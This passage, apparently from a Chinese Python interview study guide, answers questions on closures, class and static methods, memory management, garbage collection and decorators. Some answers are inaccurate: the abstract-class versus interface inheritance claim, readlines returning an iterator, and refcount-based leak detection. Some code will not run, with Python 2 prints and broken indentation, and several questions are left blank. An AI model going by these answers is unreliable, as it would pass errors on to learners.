multi()])\n```\n\u6b63\u786e\u7b54\u6848\u662f[9,9,9,9]\uff0c\u800c\u4e0d\u662f[0,3,6,9]\u4ea7\u751f\u7684\u539f\u56e0\u662fPython\u7684\u95ed\u5305\u7684\u540e\u671f\u7ed1\u5b9a\u5bfc\u81f4\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5728\u95ed\u5305\u4e2d\u7684\u53d8\u91cf\u662f\u5728\u5185\u90e8\u51fd\u6570\u88ab\u8c03\u7528\u7684\u65f6\u5019\u88ab\u67e5\u627e\u7684\uff0c\u56e0\u4e3a\uff0c\u6700\u540e\u51fd\u6570\u88ab\u8c03\u7528\u7684\u65f6\u5019\uff0cfor\u5faa\u73af\u5df2\u7ecf\u5b8c\u6210, i \u7684\u503c\u6700\u540e\u662f3,\u56e0\u6b64\u6bcf\u4e00\u4e2a\u8fd4\u56de\u503c\u7684i\u90fd\u662f3,\u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\u662f[9,9,9,9]\n### 40.\u7edf\u8ba1\u4e00\u6bb5\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u51fa\u73b0\u7684\u6b21\u6570\n```python\n# \u65b9\u6cd5\u4e00\ndef count_str(str_data):\n    \"\"\"\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u51fa\u73b0\u6b21\u6570\u7684\u51fd\u6570\"\"\"\n    dict_str = {} \n    for i in str_data:\n        dict_str[i] = dict_str.get(i, 0) + 1\n    return dict_str\ndict_str = count_str(\"AAABBCCAC\")\nstr_count_data = \"\"\nfor k, v in dict_str.items():\n    str_count_data += k + str(v)\nprint(str_count_data)\n\n# \u65b9\u6cd5\u4e8c\nfrom collections import Counter\n\nprint(\"\".join(map(lambda x: x[0] + str(x[1]), Counter(\"AAABBCCAC\").most_common())))\n```\n### 41.super\u51fd\u6570\u7684\u5177\u4f53\u7528\u6cd5\u548c\u573a\u666f\nhttps:\/\/python3-cookbook.readthedocs.io\/zh_CN\/latest\/c08\/p07_calling_method_on_parent_class.html\n\n# Python\u9ad8\u7ea7\n## \u5143\u7c7b\n### 42.Python\u4e2d\u7c7b\u65b9\u6cd5\u3001\u7c7b\u5b9e\u4f8b\u65b9\u6cd5\u3001\u9759\u6001\u65b9\u6cd5\u6709\u4f55\u533a\u522b\uff1f\n\u7c7b\u65b9\u6cd5: \u662f\u7c7b\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u5728\u5b9a\u4e49\u65f6\u9700\u8981\u5728\u4e0a\u65b9\u4f7f\u7528 @classmethod \u8fdb\u884c\u88c5\u9970,\u5f62\u53c2\u4e3acls\uff0c\u8868\u793a\u7c7b\u5bf9\u8c61\uff0c\u7c7b\u5bf9\u8c61\u548c\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u53ef\u8c03\u7528\n\n\u7c7b\u5b9e\u4f8b\u65b9\u6cd5: \u662f\u7c7b\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7684\u65b9\u6cd5,\u53ea\u6709\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\uff0c\u5f62\u53c2\u4e3aself,\u6307\u4ee3\u5bf9\u8c61\u672c\u8eab;\n\n\u9759\u6001\u65b9\u6cd5: \u662f\u4e00\u4e2a\u4efb\u610f\u51fd\u6570\uff0c\u5728\u5176\u4e0a\u65b9\u4f7f\u7528 @staticmethod \u8fdb\u884c\u88c5\u9970\uff0c\u53ef\u4ee5\u7528\u5bf9\u8c61\u76f4\u63a5\u8c03\u7528\uff0c\u9759\u6001\u65b9\u6cd5\u5b9e\u9645\u4e0a\u8ddf\u8be5\u7c7b\u6ca1\u6709\u592a\u5927\u5173\u7cfb\n### 43.\u904d\u5386\u4e00\u4e2aobject\u7684\u6240\u6709\u5c5e\u6027\uff0c\u5e76print\u6bcf\u4e00\u4e2a\u5c5e\u6027\u540d\uff1f\n```python\nclass Car:\n    def __init__(self,name,loss): # loss [\u4ef7\u683c\uff0c\u6cb9\u8017\uff0c\u516c\u91cc\u6570]\n        self.name = name\n        self.loss = loss\n    \n    def getName(self):\n        return self.name\n    \n    def getPrice(self):\n        # \u83b7\u53d6\u6c7d\u8f66\u4ef7\u683c\n        return self.loss[0]\n    \n    def getLoss(self):\n        # \u83b7\u53d6\u6c7d\u8f66\u635f\u8017\u503c\n        return self.loss[1] * self.loss[2]\n\nBmw = Car(\"\u5b9d\u9a6c\",[60,9,500]) # \u5b9e\u4f8b\u5316\u4e00\u4e2a\u5b9d\u9a6c\u8f66\u5bf9\u8c61\nprint(getattr(Bmw,\"name\")) # \u4f7f\u7528getattr()\u4f20\u5165\u5bf9\u8c61\u540d\u5b57,\u5c5e\u6027\u503c\u3002\nprint(dir(Bmw)) # \u83b7Bmw\u6240\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\n```\n### 44.\u5199\u4e00\u4e2a\u7c7b\uff0c\u5e76\u8ba9\u5b83\u5c3d\u53ef\u80fd\u591a\u7684\u652f\u6301\u64cd\u4f5c\u7b26?\n```python\nclass Array:\n    __list = []\n    \n    def __init__(self):\n        print \"constructor\"\n    \n    def __del__(self):\n        print \"destruct\"\n    \n    def __str__(self):\n        return \"this self-defined array class\"\n\n    def __getitem__(self,key):\n        return self.__list[key]\n    \n    def __len__(self):\n        return len(self.__list)\n\n    def Add(self,value):\n        self.__list.append(value)\n    \n    def Remove(self,index):\n        del self.__list[index]\n    \n    def DisplayItems(self):\n        print \"show all items---\"\n        for item in self.__list:\n            print item\n    \n        \n```\n### 45.\u4ecb\u7ecdCython\uff0cPypy Cpython Numba\u5404\u6709\u4ec0\u4e48\u7f3a\u70b9\nCython\n### 46.\u8bf7\u63cf\u8ff0\u62bd\u8c61\u7c7b\u548c\u63a5\u53e3\u7c7b\u7684\u533a\u522b\u548c\u8054\u7cfb\n\n1.\u62bd\u8c61\u7c7b\uff1a \u89c4\u5b9a\u4e86\u4e00\u7cfb\u5217\u7684\u65b9\u6cd5\uff0c\u5e76\u89c4\u5b9a\u4e86\u5fc5\u987b\u7531\u7ee7\u627f\u7c7b\u5b9e\u73b0\u7684\u65b9\u6cd5\u3002\u7531\u4e8e\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u5b58\u5728\uff0c\u6240\u4ee5\u62bd\u8c61\u7c7b\u4e0d\u80fd\u5b9e\u4f8b\u5316\u3002\u53ef\u4ee5\u5c06\u62bd\u8c61\u7c7b\u7406\u89e3\u4e3a\u6bdb\u576f\u623f\uff0c\u95e8\u7a97\uff0c\u5899\u9762\u7684\u6837\u5f0f\u7531\u4f60\u81ea\u5df1\u6765\u5b9a\uff0c\u6240\u4ee5\u62bd\u8c61\u7c7b\u4e0e\u4f5c\u4e3a\u57fa\u7c7b\u7684\u666e\u901a\u7c7b\u7684\u533a\u522b\u5728\u4e8e\u7ea6\u675f\u6027\u66f4\u5f3a\n\n2.\u63a5\u53e3\u7c7b\uff1a\u4e0e\u62bd\u8c61\u7c7b\u5f88\u76f8\u4f3c\uff0c\u8868\u73b0\u5728\u63a5\u53e3\u4e2d\u5b9a\u4e49\u7684\u65b9\u6cd5\uff0c\u5fc5\u987b\u7531\u5f15\u7528\u7c7b\u5b9e\u73b0\uff0c\u4f46\u4ed6\u4e0e\u62bd\u8c61\u7c7b\u7684\u6839\u672c\u533a\u522b\u5728\u4e8e\u7528\u9014\uff1a\u4e0e\u4e0d\u540c\u4e2a\u4f53\u95f4\u6c9f\u901a\u7684\u89c4\u5219\uff0c\u4f60\u8981\u8fdb\u5bbf\u820d\u9700\u8981\u6709\u94a5\u5319\uff0c\u8fd9\u4e2a\u94a5\u5319\u5c31\u662f\u4f60\u4e0e\u5bbf\u820d\u7684\u63a5\u53e3\uff0c\u4f60\u7684\u820d\u53cb\u4e5f\u6709\u8fd9\u4e2a\u63a5\u53e3\uff0c\u6240\u4ee5\u4ed6\u4e5f\u80fd\u8fdb\u5165\u5bbf\u820d\uff0c\u4f60\u7528\u624b\u673a\u901a\u8bdd\uff0c\u90a3\u4e48\u624b\u673a\u5c31\u662f\u4f60\u4e0e\u4ed6\u4eba\u4ea4\u6d41\u7684\u63a5\u53e3\n\n3.\u533a\u522b\u548c\u5173\u8054\uff1a\n\n1.\u63a5\u53e3\u662f\u62bd\u8c61\u7c7b\u7684\u53d8\u4f53\uff0c\u63a5\u53e3\u4e2d\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u662f\u62bd\u8c61\u7684\uff0c\u800c\u62bd\u8c61\u7c7b\u4e2d\u53ef\u4ee5\u6709\u975e\u62bd\u8c61\u65b9\u6cd5\uff0c\u62bd\u8c61\u7c7b\u662f\u58f0\u660e\u65b9\u6cd5\u7684\u5b58\u5728\u800c\u4e0d\u53bb\u5b9e\u73b0\u5b83\u7684\u7c7b\n\n2.\u63a5\u53e3\u53ef\u4ee5\u7ee7\u627f\uff0c\u62bd\u8c61\u7c7b\u4e0d\u884c\n\n3.\u63a5\u53e3\u5b9a\u4e49\u65b9\u6cd5\uff0c\u6ca1\u6709\u5b9e\u73b0\u7684\u4ee3\u7801\uff0c\u800c\u62bd\u8c61\u7c7b\u53ef\u4ee5\u5b9e\u73b0\u90e8\u5206\u65b9\u6cd5\n\n4.\u63a5\u53e3\u4e2d\u57fa\u672c\u6570\u636e\u7c7b\u578b\u4e3astatic\u800c\u62bd\u8c61\u7c7b\u4e0d\u662f\n\n### 47.Python\u4e2d\u5982\u4f55\u52a8\u6001\u83b7\u53d6\u548c\u8bbe\u7f6e\u5bf9\u8c61\u7684\u5c5e\u6027\uff1f\n\n```python\nif hasattr(Parent, 'x'):\n    print(getattr(Parent, 'x'))\n    setattr(Parent, 'x',3)\nprint(getattr(Parent,'x'))\n```\n\n\n\n## \u5185\u5b58\u7ba1\u7406\u4e0e\u5783\u573e\u56de\u6536\u673a\u5236\n### 48.\u54ea\u4e9b\u64cd\u4f5c\u4f1a\u5bfc\u81f4Python\u5185\u5b58\u6ea2\u51fa\uff0c\u600e\u4e48\u5904\u7406\uff1f\n### 49.\u5173\u4e8ePython\u5185\u5b58\u7ba1\u7406,\u4e0b\u5217\u8bf4\u6cd5\u9519\u8bef\u7684\u662f  B\n\nA,\u53d8\u91cf\u4e0d\u5fc5\u4e8b\u5148\u58f0\u660e                                   B,\u53d8\u91cf\u65e0\u987b\u5148\u521b\u5efa\u548c\u8d4b\u503c\u800c\u76f4\u63a5\u4f7f\u7528\n\nC,\u53d8\u91cf\u65e0\u987b\u6307\u5b9a\u7c7b\u578b                                   D,\u53ef\u4ee5\u4f7f\u7528del\u91ca\u653e\u8d44\u6e90\n\n### 50.Python\u7684\u5185\u5b58\u7ba1\u7406\u673a\u5236\u53ca\u8c03\u4f18\u624b\u6bb5\uff1f\n\n\u5185\u5b58\u7ba1\u7406\u673a\u5236: \u5f15\u7528\u8ba1\u6570\u3001\u5783\u573e\u56de\u6536\u3001\u5185\u5b58\u6c60\n\n\u5f15\u7528\u8ba1\u6570\uff1a\u5f15\u7528\u8ba1\u6570\u662f\u4e00\u79cd\u975e\u5e38\u9ad8\u6548\u7684\u5185\u5b58\u7ba1\u7406\u624b\u6bb5\uff0c\u5f53\u4e00\u4e2aPython\u5bf9\u8c61\u88ab\u5f15\u7528\u65f6\u5176\u5f15\u7528\u8ba1\u6570\u589e\u52a01,\n\n\u5f53\u5176\u4e0d\u518d\u88ab\u4e00\u4e2a\u53d8\u91cf\u5f15\u7528\u65f6\u5219\u8ba1\u6570\u51cf1,\u5f53\u5f15\u7528\u8ba1\u6570\u7b49\u4e8e0\u65f6\u5bf9\u8c61\u88ab\u5220\u9664\u3002\u5f31\u5f15\u7528\u4e0d\u4f1a\u589e\u52a0\u5f15\u7528\u8ba1\u6570\n\n\u5783\u573e\u56de\u6536\uff1a\n\n1.\u5f15\u7528\u8ba1\u6570\n\n\u5f15\u7528\u8ba1\u6570\u4e5f\u662f\u4e00\u79cd\u5783\u573e\u6536\u96c6\u673a\u5236\uff0c\u800c\u4e14\u4e5f\u662f\u4e00\u79cd\u6700\u76f4\u89c2\u3001\u6700\u7b80\u5355\u7684\u5783\u573e\u6536\u96c6\u6280\u672f\u3002\u5f53Python\u7684\u67d0\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u964d\u4e3a0\u65f6\uff0c\u8bf4\u660e\u6ca1\u6709\u4efb\u4f55\u5f15\u7528\u6307\u5411\u8be5\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u5c31\u6210\u4e3a\u8981\u88ab\u56de\u6536\u7684\u5783\u573e\u4e86\u3002\u6bd4\u5982\u67d0\u4e2a\u65b0\u5efa\u5bf9\u8c61\uff0c\u5b83\u88ab\u5206\u914d\u7ed9\u67d0\u4e2a\u5f15\u7528\uff0c\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u53d8\u4e3a1\uff0c\u5982\u679c\u5f15\u7528\u88ab\u5220\u9664\uff0c\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u4e3a0,\u90a3\u4e48\u8be5\u5bf9\u8c61\u5c31\u53ef\u4ee5\u88ab\u5783\u573e\u56de\u6536\u3002\u4e0d\u8fc7\u5982\u679c\u51fa\u73b0\u5faa\u73af\u5f15\u7528\u7684\u8bdd\uff0c\u5f15\u7528\u8ba1\u6570\u673a\u5236\u5c31\u4e0d\u518d\u8d77\u6709\u6548\u7684\u4f5c\u7528\u4e86\u3002\n\n2.\u6807\u8bb0\u6e05\u9664\n\nhttps:\/\/foofish.net\/python-gc.html\n\n\u8c03\u4f18\u624b\u6bb5\n\n1.\u624b\u52a8\u5783\u573e\u56de\u6536\n\n2.\u8c03\u9ad8\u5783\u573e\u56de\u6536\u9608\u503c\n\n3.\u907f\u514d\u5faa\u73af\u5f15\u7528\n\n### 51.\u5185\u5b58\u6cc4\u9732\u662f\u4ec0\u4e48\uff1f\u5982\u4f55\u907f\u514d\uff1f\n\n**\u5185\u5b58\u6cc4\u6f0f**\u6307\u7531\u4e8e\u758f\u5ffd\u6216\u9519\u8bef\u9020\u6210\u7a0b\u5e8f\u672a\u80fd\u91ca\u653e\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528\u7684\u5185\u5b58\u3002\u5185\u5b58\u6cc4\u6f0f\u5e76\u975e\u6307\u5185\u5b58\u5728\u7269\u7406\u4e0a\u7684\u6d88\u5931\uff0c\u800c\u662f\u5e94\u7528\u7a0b\u5e8f\u5206\u914d\u67d0\u6bb5\u5185\u5b58\u540e\uff0c\u7531\u4e8e\u8bbe\u8ba1\u9519\u8bef\uff0c\u5bfc\u81f4\u5728\u91ca\u653e\u8be5\u6bb5\u5185\u5b58\u4e4b\u524d\u5c31\u5931\u53bb\u4e86\u5bf9\u8be5\u6bb5\u5185\u5b58\u7684\u63a7\u5236\uff0c\u4ece\u800c\u9020\u6210\u4e86\u5185\u5b58\u7684\u6d6a\u8d39\u3002\n\n\u6709`__del__()`\u51fd\u6570\u7684\u5bf9\u8c61\u95f4\u7684\u5faa\u73af\u5f15\u7528\u662f\u5bfc\u81f4\u5185\u5b58\u6cc4\u9732\u7684\u4e3b\u51f6\u3002\u4e0d\u4f7f\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6\u4f7f\u7528: del object \u6765\u5220\u9664\u4e00\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u5c31\u53ef\u4ee5\u6709\u6548\u9632\u6b62\u5185\u5b58\u6cc4\u9732\u95ee\u9898\u3002\n\n\u901a\u8fc7Python\u6269\u5c55\u6a21\u5757gc \u6765\u67e5\u770b\u4e0d\u80fd\u56de\u6536\u7684\u5bf9\u8c61\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\n\n\u53ef\u4ee5\u901a\u8fc7 sys.getrefcount(obj) \u6765\u83b7\u53d6\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\uff0c\u5e76\u6839\u636e\u8fd4\u56de\u503c\u662f\u5426\u4e3a0\u6765\u5224\u65ad\u662f\u5426\u5185\u5b58\u6cc4\u9732\n\n## \u51fd\u6570\n### 52.python\u5e38\u89c1\u7684\u5217\u8868\u63a8\u5bfc\u5f0f\uff1f\n\n[\u8868\u8fbe\u5f0f for \u53d8\u91cf in \u5217\u8868] \u6216\u8005 [\u8868\u8fbe\u5f0f for \u53d8\u91cf in \u5217\u8868 if  \u6761\u4ef6]\n\n### 53.\u7b80\u8ff0read\u3001readline\u3001readlines\u7684\u533a\u522b\uff1f\n\nread                           \u8bfb\u53d6\u6574\u4e2a\u6587\u4ef6\n\nreadline                     \u8bfb\u53d6\u4e0b\u4e00\u884c\n\nreadlines                   \u8bfb\u53d6\u6574\u4e2a\u6587\u4ef6\u5230\u4e00\u4e2a\u8fed\u4ee3\u5668\u4ee5\u4f9b\u6211\u4eec\u904d\u5386\n\n### 54.\u4ec0\u4e48\u662fHash\uff08\u6563\u5217\u51fd\u6570\uff09\uff1f\n\n**\u6563\u5217\u51fd\u6570**\uff08\u82f1\u8bed\uff1aHash function\uff09\u53c8\u79f0**\u6563\u5217\u7b97\u6cd5**\u3001**\u54c8\u5e0c\u51fd\u6570**\uff0c\u662f\u4e00\u79cd\u4ece\u4efb\u4f55\u4e00\u79cd\u6570\u636e\u4e2d\u521b\u5efa\u5c0f\u7684\u6570\u5b57\u201c\u6307\u7eb9\u201d\u7684\u65b9\u6cd5\u3002\u6563\u5217\u51fd\u6570\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\uff0c\u5c06\u6570\u636e\u7684\u683c\u5f0f\u56fa\u5b9a\u4e0b\u6765\u3002\u8be5\u51fd\u6570\u5c06\u6570\u636e\u6253\u4e71\u6df7\u5408\uff0c\u91cd\u65b0\u521b\u5efa\u4e00\u4e2a\u53eb\u505a**\u6563\u5217\u503c**\uff08hash values\uff0chash codes\uff0chash sums\uff0c\u6216hashes\uff09\u7684\u6307\u7eb9\u3002\u6563\u5217\u503c\u901a\u5e38\u7528\u4e00\u4e2a\u77ed\u7684\u968f\u673a\u5b57\u6bcd\u548c\u6570\u5b57\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\u6765\u4ee3\u8868\n\n### 55.python\u51fd\u6570\u91cd\u8f7d\u673a\u5236\uff1f\n\n\u51fd\u6570\u91cd\u8f7d\u4e3b\u8981\u662f\u4e3a\u4e86\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\u3002\n1\u3002\u53ef\u53d8\u53c2\u6570\u7c7b\u578b\u3002\n2\u3002\u53ef\u53d8\u53c2\u6570\u4e2a\u6570\u3002\n\n\u53e6\u5916\uff0c\u4e00\u4e2a\u57fa\u672c\u7684\u8bbe\u8ba1\u539f\u5219\u662f\uff0c\u4ec5\u4ec5\u5f53\u4e24\u4e2a\u51fd\u6570\u9664\u4e86\u53c2\u6570\u7c7b\u578b\u548c\u53c2\u6570\u4e2a\u6570\u4e0d\u540c\u4ee5\u5916\uff0c\u5176\u529f\u80fd\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u6b64\u65f6\u624d\u4f7f\u7528\u51fd\u6570\u91cd\u8f7d\uff0c\u5982\u679c\u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u5176\u5b9e\u4e0d\u540c\uff0c\u90a3\u4e48\u4e0d\u5e94\u5f53\u4f7f\u7528\u91cd\u8f7d\uff0c\u800c\u5e94\u5f53\u4f7f\u7528\u4e00\u4e2a\u540d\u5b57\u4e0d\u540c\u7684\u51fd\u6570\u3002\n\n\u597d\u5427\uff0c\u90a3\u4e48\u5bf9\u4e8e\u60c5\u51b5 1 \uff0c\u51fd\u6570\u529f\u80fd\u76f8\u540c\uff0c\u4f46\u662f\u53c2\u6570\u7c7b\u578b\u4e0d\u540c\uff0cpython \u5982\u4f55\u5904\u7406\uff1f\u7b54\u6848\u662f\u6839\u672c\u4e0d\u9700\u8981\u5904\u7406\uff0c\u56e0\u4e3a python \u53ef\u4ee5\u63a5\u53d7\u4efb\u4f55\u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5982\u679c\u51fd\u6570\u7684\u529f\u80fd\u76f8\u540c\uff0c\u90a3\u4e48\u4e0d\u540c\u7684\u53c2\u6570\u7c7b\u578b\u5728 python \u4e2d\u5f88\u53ef\u80fd\u662f\u76f8\u540c\u7684\u4ee3\u7801\uff0c\u6ca1\u6709\u5fc5\u8981\u505a\u6210\u4e24\u4e2a\u4e0d\u540c\u51fd\u6570\u3002\n\n\u90a3\u4e48\u5bf9\u4e8e\u60c5\u51b5 2 \uff0c\u51fd\u6570\u529f\u80fd\u76f8\u540c\uff0c\u4f46\u53c2\u6570\u4e2a\u6570\u4e0d\u540c\uff0cpython \u5982\u4f55\u5904\u7406\uff1f\u5927\u5bb6\u77e5\u9053\uff0c\u7b54\u6848\u5c31\u662f\u7f3a\u7701\u53c2\u6570\u3002\u5bf9\u90a3\u4e9b\u7f3a\u5c11\u7684\u53c2\u6570\u8bbe\u5b9a\u4e3a\u7f3a\u7701\u53c2\u6570\u5373\u53ef\u89e3\u51b3\u95ee\u9898\u3002\u56e0\u4e3a\u4f60\u5047\u8bbe\u51fd\u6570\u529f\u80fd\u76f8\u540c\uff0c\u90a3\u4e48\u90a3\u4e9b\u7f3a\u5c11\u7684\u53c2\u6570\u7ec8\u5f52\u662f\u9700\u8981\u7528\u7684\u3002\n\n\u597d\u4e86\uff0c\u9274\u4e8e\u60c5\u51b5 1 \u8ddf \u60c5\u51b5 2 \u90fd\u6709\u4e86\u89e3\u51b3\u65b9\u6848\uff0cpython \u81ea\u7136\u5c31\u4e0d\u9700\u8981\u51fd\u6570\u91cd\u8f7d\u4e86\u3002\n\n### 56.\u5199\u4e00\u4e2a\u51fd\u6570\u627e\u51fa\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u4e2d\uff0c\u7b2c\u4e8c\u5927\u7684\u6570\n### 57.\u624b\u5199\u4e00\u4e2a\u5224\u65ad\u65f6\u95f4\u7684\u88c5\u9970\u5668\n```python\nimport datetime\n\n\nclass TimeException(Exception):\n    def __init__(self, exception_info):\n        super().__init__()\n        self.info = exception_info\n\n    def __str__(self):\n        return self.info\n\n\ndef timecheck(func):\n    def wrapper(*args, **kwargs):\n        if datetime.datetime.now().year == 2019:\n            func(*args, **kwargs)\n        else:\n            raise TimeException(\"\u51fd\u6570\u5df2\u8fc7\u65f6\")\n\n    return wrapper\n\n\n@timecheck\ndef test(name):\n    print(\"Hello {}, 2019 Happy\".format(name))\n\n\nif __name__ == \"__main__\":\n    test(\"backbp\")\n```\n### 58.\u4f7f\u7528Python\u5185\u7f6e\u7684filter()\u65b9\u6cd5\u6765\u8fc7\u6ee4\uff1f\n```python\nlist(filter(lambda x: x % 2 == 0, range(10)))\n```\n### 59.\u7f16\u5199\u51fd\u6570\u76844\u4e2a\u539f\u5219\n\n1.\u51fd\u6570\u8bbe\u8ba1\u8981\u5c3d\u91cf\u77ed\u5c0f\n\n2.\u51fd\u6570\u58f0\u660e\u8981\u505a\u5230\u5408\u7406\u3001\u7b80\u5355\u3001\u6613\u4e8e\u4f7f\u7528\n\n3.\u51fd\u6570\u53c2\u6570\u8bbe\u8ba1\u5e94\u8be5\u8003\u8651\u5411\u4e0b\u517c\u5bb9\n\n4.\u4e00\u4e2a\u51fd\u6570\u53ea\u505a\u4e00\u4ef6\u4e8b\u60c5\uff0c\u5c3d\u91cf\u4fdd\u8bc1\u51fd\u6570\u8bed\u53e5\u7c92\u5ea6\u7684\u4e00\u81f4\u6027\n\n### 60.\u51fd\u6570\u8c03\u7528\u53c2\u6570\u7684\u4f20\u9012\u65b9\u5f0f\u662f\u503c\u4f20\u9012\u8fd8\u662f\u5f15\u7528\u4f20\u9012\uff1f\n\nPython\u7684\u53c2\u6570\u4f20\u9012\u6709\uff1a\u4f4d\u7f6e\u53c2\u6570\u3001\u9ed8\u8ba4\u53c2\u6570\u3001\u53ef\u53d8\u53c2\u6570\u3001\u5173\u952e\u5b57\u53c2\u6570\u3002\n\n\u51fd\u6570\u7684\u4f20\u503c\u5230\u5e95\u662f\u503c\u4f20\u9012\u8fd8\u662f\u5f15\u7528\u4f20\u9012\u3001\u8981\u5206\u60c5\u51b5\uff1a\n\n\u4e0d\u53ef\u53d8\u53c2\u6570\u7528\u503c\u4f20\u9012\uff1a\u50cf\u6574\u6570\u548c\u5b57\u7b26\u4e32\u8fd9\u6837\u7684\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u662f\u901a\u8fc7\u62f7\u8d1d\u8fdb\u884c\u4f20\u9012\u7684\uff0c\u56e0\u4e3a\u4f60\u65e0\u8bba\u5982\u4f55\u90fd\u4e0d\u53ef\u80fd\u5728\u539f\u5904\u6539\u53d8\u4e0d\u53ef\u53d8\u5bf9\u8c61\u3002\n\n\u53ef\u53d8\u53c2\u6570\u662f\u5f15\u7528\u4f20\u9012\uff1a\u6bd4\u5982\u50cf\u5217\u8868\uff0c\u5b57\u5178\u8fd9\u6837\u7684\u5bf9\u8c61\u662f\u901a\u8fc7\u5f15\u7528\u4f20\u9012\u3001\u548cC\u8bed\u8a00\u91cc\u9762\u7684\u7528\u6307\u9488\u4f20\u9012\u6570\u7ec4\u5f88\u76f8\u4f3c\uff0c\u53ef\u53d8\u5bf9\u8c61\u80fd\u5728\u51fd\u6570\u5185\u90e8\u6539\u53d8\u3002\n\n### 61.\u5982\u4f55\u5728function\u91cc\u9762\u8bbe\u7f6e\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\n\n```python\nglobals() # \u8fd4\u56de\u5305\u542b\u5f53\u524d\u4f5c\u7528\u4f59\u5168\u5c40\u53d8\u91cf\u7684\u5b57\u5178\u3002\nglobal \u53d8\u91cf \u8bbe\u7f6e\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\n```\n\n### 62.\u5bf9\u7f3a\u7701\u53c2\u6570\u7684\u7406\u89e3 \uff1f\n\n\u7f3a\u7701\u53c2\u6570\u6307\u5728\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u6ca1\u6709\u4f20\u5165\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u8c03\u7528\u9ed8\u8ba4\u7684\u53c2\u6570\uff0c\u5728\u8c03\u7528\u51fd\u6570\u7684\u540c\u65f6\u8d4b\u503c\u65f6\uff0c\u6240\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u66ff\u4ee3\u9ed8\u8ba4\u53c2\u6570\u3002\n\n*args\u662f\u4e0d\u5b9a\u957f\u53c2\u6570\uff0c\u5b83\u53ef\u4ee5\u8868\u793a\u8f93\u5165\u53c2\u6570\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u4ee5\u662f\u4efb\u610f\u591a\u4e2a\u3002\n\n**kwargs\u662f\u5173\u952e\u5b57\u53c2\u6570\uff0c\u8d4b\u503c\u7684\u65f6\u5019\u662f\u4ee5\u952e\u503c\u5bf9\u7684\u65b9\u5f0f\uff0c\u53c2\u6570\u53ef\u4ee5\u662f\u4efb\u610f\u591a\u5bf9\u5728\u5b9a\u4e49\u51fd\u6570\u7684\u65f6\u5019\n\n\u4e0d\u786e\u5b9a\u4f1a\u6709\u591a\u5c11\u53c2\u6570\u4f1a\u4f20\u5165\u65f6\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e24\u4e2a\u53c2\u6570\n\n### 63.Mysql\u600e\u4e48\u9650\u5236IP\u8bbf\u95ee\uff1f\n\n\n\n### 64.\u5e26\u53c2\u6570\u7684\u88c5\u9970\u5668?\n\n\u5e26\u5b9a\u957f\u53c2\u6570\u7684\u88c5\u9970\u5668\n\n```python\ndef new_func(func):\n    def wrappedfun(username, passwd):\n        if username == 'root' and passwd == '123456789':\n            print('\u901a\u8fc7\u8ba4\u8bc1')\n            print('\u5f00\u59cb\u6267\u884c\u9644\u52a0\u529f\u80fd')\n            return func()\n       \telse:\n            print('\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef')\n            return\n    return wrappedfun\n\n@new_func\ndef origin():\n    print('\u5f00\u59cb\u6267\u884c\u51fd\u6570')\norigin('root','123456789')\n```\n\n\u5e26\u4e0d\u5b9a\u957f\u53c2\u6570\u7684\u88c5\u9970\u5668\n\n```python\ndef new_func(func):\n    def wrappedfun(*parts):\n        if parts:\n            counts = len(parts)\n            print('\u672c\u7cfb\u7edf\u5305\u542b ', end='')\n            for part in parts:\n                print(part, ' ',end='')\n            print('\u7b49', counts, '\u90e8\u5206')\n            return func()\n        else:\n            print('\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef')\n            return func()\n   return wrappedfun\n\n```\n\n### 65.\u4e3a\u4ec0\u4e48\u51fd\u6570\u540d\u5b57\u53ef\u4ee5\u5f53\u505a\u53c2\u6570\u7528?\n\nPython\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u51fd\u6570\u540d\u662f\u51fd\u6570\u5728\u5185\u5b58\u4e2d\u7684\u7a7a\u95f4\uff0c\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\n\n### 